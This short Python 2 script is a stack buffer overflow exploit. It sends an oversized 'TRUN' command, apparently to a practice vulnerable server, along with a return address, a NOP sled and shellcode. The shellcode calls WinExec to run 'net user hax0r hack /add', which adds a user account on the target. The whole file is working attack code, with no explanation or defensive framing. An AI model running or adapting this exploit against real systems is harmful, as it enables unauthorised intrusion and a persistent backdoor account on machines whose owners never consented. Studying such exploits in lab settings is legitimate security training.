import sys
import socket

ip = sys.argv[1]
port = int(sys.argv[2])



buf ="\x33\xc0" 		# XOR EAX EAX
buf +="\x50"			# PUSH EAX
buf +="\x68\x2f\x61\x64\x64"
buf +="\x68\x61\x63\x6b\x20"
buf +="\x68\x30\x72\x20\x68"
buf +="\x68\x20\x68\x61\x78"
buf +="\x68\x75\x73\x65\x72"
buf +="\x68\x6e\x65\x74\x20"
buf +="\x8b\xc4"		# MOV EAX,ESP
buf +="\x6a\x01"		# PUSH 1
buf +="\x50"			# PUSH EAX 
buf +="\xBB\xFD\xe5\x90\x75"	# Move address of WinExec to EBX
buf +="\xFF\xD3"		# CALL EBX

try:
	#set up socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(5)
	s.connect((ip, port))
	#grab banner
	#print s.recv(1024)
	#generate garbage
	garbage = "A" * 2006
	ret = "\xAF\x11\x50\x62" 	
	nop = "\x90" * 24
	badstr = "TRUN ." + garbage + ret + nop + buf + "\r\n"

	s.send(badstr)
	s.recv(1024)
	s.close()

except:
	print "*******************"
	print "!!!!!!Crash!!!!!!!!"
	print "*******************"